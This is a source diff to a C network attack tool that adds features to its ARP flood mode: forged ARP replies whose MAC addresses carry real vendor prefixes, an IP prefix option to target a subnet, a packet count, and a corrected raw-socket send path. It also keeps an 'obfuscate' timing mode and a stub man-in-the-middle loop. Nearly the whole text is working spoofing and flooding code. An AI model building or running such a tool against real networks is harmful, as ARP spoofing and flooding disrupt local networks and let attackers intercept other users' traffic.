@@ -43,6 +43,10 @@
 #include "strlcpy.h"
 #include "mersenne_twister.h"
 #include "bpf.h"
+#include "hash.h"
+#define __DATA__
+#include "oui.h"
+#undef __DATA__
 
 #define DEFAULT_INTERCEPTS  2000
 #define DEFAULT_ROUTES      32
@@ -99,13 +103,16 @@ static struct refresh_table reftable;
 static struct routing_table routetable;
 static struct agressive_table agresstable;
 
-static const char *short_options = "d:a:r:foVvh";
+static const char *short_options = "d:a:r:p:fnc:oVvh";
 
 static struct option long_options[] = {
 	{"dev", required_argument, 0, 'd'},
 	{"agressive", required_argument, 0, 'a'},
 	{"routing", required_argument, 0, 'r'},
+	{"prefix", required_argument, 0, 'p'},
+	{"count", required_argument, 0, 'c'},
 	{"flood", no_argument, 0, 'f'},
+	{"other", no_argument, 0, 'n'},
 	{"obfuscate", no_argument, 0, 'o'},
 	{"verbose", no_argument, 0, 'V'},
 	{"version", no_argument, 0, 'v'},
@@ -143,6 +150,8 @@ static struct arppkt pkt_arp_response;
 
 #define IP_ALEN 4
 
+static struct hash_table ethernet_oui;
+
 static void signal_handler(int number)
 {
 	switch (number) {
@@ -169,7 +178,10 @@ static void help(void)
 	printf("  -a|--agressive <conn>  Agressive startup with known connections\n");
 	printf("  -r|--routing <table>   Use table file for routing information\n");
 	printf("  -f|--flood             Flood network with random ARP replies\n");
+	printf("  -p|--prefix <pfix>     Use IP prefix like \'192.168\' for generation\n");
+	printf("  -c|--count <num>       Flood with \'num\' packets and exit\n");
 	printf("  -o|--obfuscate         Try to be more calm\n");
+	printf("  -n|--other             Use other address than sender address\n");
 	printf("  -V|--verbose           Be more verbose\n");
 	printf("  -v|--version           Print version\n");
 	printf("  -h|--help              Print this help\n");
@@ -204,34 +216,108 @@ static void version(void)
 	exit(EXIT_SUCCESS);
 }
 
-static int arp_loop(const char *ifname, const char *routing_table,
+static void init_oui_vendors(void)
+{
+	void **pos;
+	size_t i, len = sizeof(vendor_db) / sizeof(struct vendor_id);
+
+	init_hash(&ethernet_oui);
+	for (i = 0; i < len; ++i) {
+		pos = insert_hash(vendor_db[i].id, &vendor_db[i],
+				  &ethernet_oui);
+		if (pos) {
+			vendor_db[i].next = *pos;
+			*pos = &vendor_db[i];
+		}
+	}
+}
+
+static char *lookup_oui_vendor(unsigned int id)
+{
+	struct vendor_id *entry = lookup_hash(id, &ethernet_oui);
+	while (entry && id != entry->id)
+		entry = entry->next;
+	return (entry && id == entry->id ? entry->vendor : NULL);
+}
+
+static int prefix_to_addr(char *prefix, uint8_t *ip_pre, size_t len)
+{
+	int ret = 0, flag = 0;
+	char *pp = prefix;
+
+	if (!prefix)
+		return 0;
+	memset(ip_pre, 0, len);
+
+	/* prefix is null-terminated due to xstrdup */
+	while (*prefix != 0) {
+		if (*prefix == '.') {
+			*prefix = 0;
+			if (ret < len) {
+				ip_pre[ret++] = atoi(pp);
+				pp = ++prefix;
+				continue;
+			} else {
+				flag = 1;
+				break;
+			}
+		} else if (isdigit(*prefix)) {
+			prefix++;
+			continue;
+		} else {
+			error_and_die(EXIT_FAILURE, "No valid prefix provided!\n");
+		}
+	}
+
+	if (!flag && isdigit(*(prefix - 1)))
+		ip_pre[ret++] = atoi(pp);
+	ret = ret == 4 ? 3 : ret;
+	return ret;
+}
+
+static int arp_loop(const char *ifname, char *prefix,
+		    const char *routing_table,
 		    const char *connections, int obfuscate)
 {
 	printf("MD: MITM%s\n\n", obfuscate ? " OBCTE" : "");
+
 	return 0;
 }
 
-static int arp_flood(const char *ifname, int obfuscate)
+static int arp_flood(const char *ifname, char *prefix, int obfuscate,
+		     int count, int other)
 {
-	int i, j, limit, sock;
+	int i, j, limit, sock, pre_len;
 	uint32_t secs = mt_rand_int32() % 30;
+	uint32_t vendor;
 	uint8_t mac_addr[ETH_ALEN];
 	uint8_t ip_addr[IP_ALEN];
+	uint8_t ip_pre[IP_ALEN];
 	double sleeptime = 0.0;
 	ssize_t ret;
 	struct in_addr ipa;
-	struct sockaddr	s_addr;
+	struct sockaddr_ll s_addr;
+	struct ifreq if_req;
 
 	printf("MD: FLD%s\n\n", obfuscate ? " OBCTE" : "");
 
 	sock = pf_socket();
 
-	while (likely(!sigint)) {
+	memset(&if_req, 0, sizeof(if_req));
+	strlcpy(if_req.ifr_name, ifname, IFNAMSIZ);
+	ret = ioctl(sock, SIOCGIFINDEX, &if_req);
+	if (ret < 0)
+		error_and_die(EXIT_FAILURE, "Cannot ioctl ifname!\n");
+
+	pre_len = 0;
+	pre_len = prefix_to_addr(prefix, ip_pre, sizeof(ip_pre));
+
+	while (likely(!sigint) && count != 0) {
 		limit = obfuscate ? 1 + mt_rand_int32() % 10 : 1 + mt_rand_int32() % 12000;
 
 		printf("Begin flooding %u pkts...\n", limit);
 
-		for (i = 0; i < limit; ++i) {
+		for (i = 0; i < limit && count != 0; ++i) {
 			memset(&pkt_arp_response, 0, sizeof(pkt_arp_response));
 
 			pkt_arp_response.h_proto = htons(0x0806);
@@ -241,17 +327,47 @@ static int arp_flood(const char *ifname, int obfuscate)
 			pkt_arp_response.ar_pln = 4;
 			pkt_arp_response.ar_op = htons(ARPOP_REPLY);
 
-			for (j = 0; j < ETH_ALEN; ++j)
+			vendor = mt_rand_int32() %
+				 (sizeof(vendor_db) / sizeof(struct vendor_id));
+			vendor = vendor_db[vendor].id;
+
+			mac_addr[0] = (vendor >> 16) & 0xFF;
+			mac_addr[1] = (vendor >>  8) & 0xFF; 
+			mac_addr[2] = (vendor)       & 0xFF;
+
+			for (j = 3; j < ETH_ALEN; ++j)
 				mac_addr[j] = 1 + mt_rand_int32() % 255;
-			for (j = 0; j < IP_ALEN; ++j)
-				ip_addr[j] = 1 + mt_rand_int32() % 255;
+
+			for (j = 0; j < IP_ALEN; ++j) {
+				if (j < pre_len)
+					ip_addr[j] = ip_pre[j];
+				else
+					ip_addr[j] = 1 + mt_rand_int32() % 255;
+			}
 
 			memcpy(pkt_arp_response.h_source, mac_addr, ETH_ALEN);
 			memcpy(pkt_arp_response.ar_sha, mac_addr, ETH_ALEN);
 			memcpy(pkt_arp_response.ar_sip, ip_addr, IP_ALEN);
 
-			for (j = 0; j < ETH_ALEN; ++j)
+			vendor = mt_rand_int32() %
+				 (sizeof(vendor_db) / sizeof(struct vendor_id));
+			vendor = vendor_db[vendor].id;
+
+			mac_addr[0] = (vendor >> 16) & 0xFF;
+			mac_addr[1] = (vendor >>  8) & 0xFF; 
+			mac_addr[2] = (vendor)       & 0xFF;
+
+			for (j = 3; j < ETH_ALEN; ++j)
 				mac_addr[j] = 1 + mt_rand_int32() % 255;
+
+			if (other) {
+				for (j = 0; j < IP_ALEN; ++j) {
+					if (j < pre_len)
+						ip_addr[j] = ip_pre[j];
+					else
+						ip_addr[j] = 1 + mt_rand_int32() % 255;
+				}
+			}
 
 			memcpy(pkt_arp_response.h_dest, mac_addr, ETH_ALEN);
 			memcpy(pkt_arp_response.ar_tha, mac_addr, ETH_ALEN);
@@ -259,20 +375,26 @@ static int arp_flood(const char *ifname, int obfuscate)
 
 			if (verbose) {
 				memcpy(&ipa, ip_addr, IP_ALEN);
-				print_green("%s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
+				print_green("%s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x (%s)",
 					    inet_ntoa(ipa), mac_addr[0], mac_addr[1],
 					    mac_addr[2], mac_addr[3], mac_addr[4],
-					    mac_addr[5]);
+					    mac_addr[5],
+					    lookup_oui_vendor((mac_addr[0] << 16) |
+							      (mac_addr[1] <<  8) |
+							      (mac_addr[2])));
 			}
 
 			memset(&s_addr, 0, sizeof(s_addr));
-			strlcpy(s_addr.sa_data, ifname, sizeof(s_addr.sa_data));
+			s_addr.sll_family = PF_PACKET;
+			s_addr.sll_protocol = htons(0x0806);
+			s_addr.sll_halen = 6;
+			s_addr.sll_ifindex = if_req.ifr_ifindex;
 
 			ret = sendto(sock, &pkt_arp_response,
-				     sizeof(pkt_arp_response), 0, &s_addr,
-				     sizeof(s_addr));
+				     sizeof(pkt_arp_response), 0,
+				     (struct sockaddr *) &s_addr, sizeof(s_addr));
 			if (ret < 0) {
-				whine("Cannot send arp packet! Interface down?\n");
+				perror("Cannot send arp packet! Interface down?");
 				goto out;
 			}
 
@@ -281,6 +403,8 @@ static int arp_flood(const char *ifname, int obfuscate)
 
 			/* We fake at least some time gap ... */
 			xnanosleep(0.0001 * mt_rand_real3());
+			if (count != -1)
+				count--;
 		}
 
 		sleeptime =  obfuscate ? 1.0 + mt_rand_real3() * secs : 0.0;
@@ -303,10 +427,11 @@ static void header(void)
 
 int main(int argc, char **argv)
 {
-	int c, opt_index, ret, flood = 0, obfuscate = 0;
+	int c, opt_index, ret, flood = 0, obfuscate = 0, count = -1, other = 0;
 	char *ifname = NULL;
 	char *routing_table = NULL;
 	char *connections = NULL;
+	char *prefix = NULL;
 
 	check_for_root_maybe_die();
 
@@ -333,11 +458,20 @@ int main(int argc, char **argv)
 		case 'r':
 			routing_table = xstrdup(optarg);
 			break;
+		case 'p':
+			prefix = xstrdup(optarg);
+			break;
 		case 'f':
 			flood = 1;
 			break;
 		case 'o':
 			obfuscate = 1;
+			break;
+		case 'n':
+			other = 1;
+			break;
+		case 'c':
+			count = atoi(optarg);
 			break;
 		case 'V':
 			verbose = 1;
@@ -346,6 +480,8 @@ int main(int argc, char **argv)
 			switch (optopt) {
 			case 'd':
 			case 'a':
+			case 'p':
+			case 'c':
 			case 'r':
 				error_and_die(EXIT_FAILURE, "Option -%c "
 					      "requires an argument!\n",
@@ -376,15 +512,19 @@ int main(int argc, char **argv)
 	register_signal(SIGSEGV, muntrace_handler);
 
 	mt_init_by_random_device();
+	init_oui_vendors();
 
 	header();
 
 	if (flood)
-		ret = arp_flood(ifname, obfuscate);
+		ret = arp_flood(ifname, prefix, obfuscate, count, other);
 	else
-		ret = arp_loop(ifname, routing_table, connections, obfuscate);
+		ret = arp_loop(ifname, prefix, routing_table, connections,
+			       obfuscate);
 
 	xfree(ifname);
+	if (prefix)
+		xfree(prefix);
 	if (routing_table)
 		xfree(routing_table);
 	if (connections)
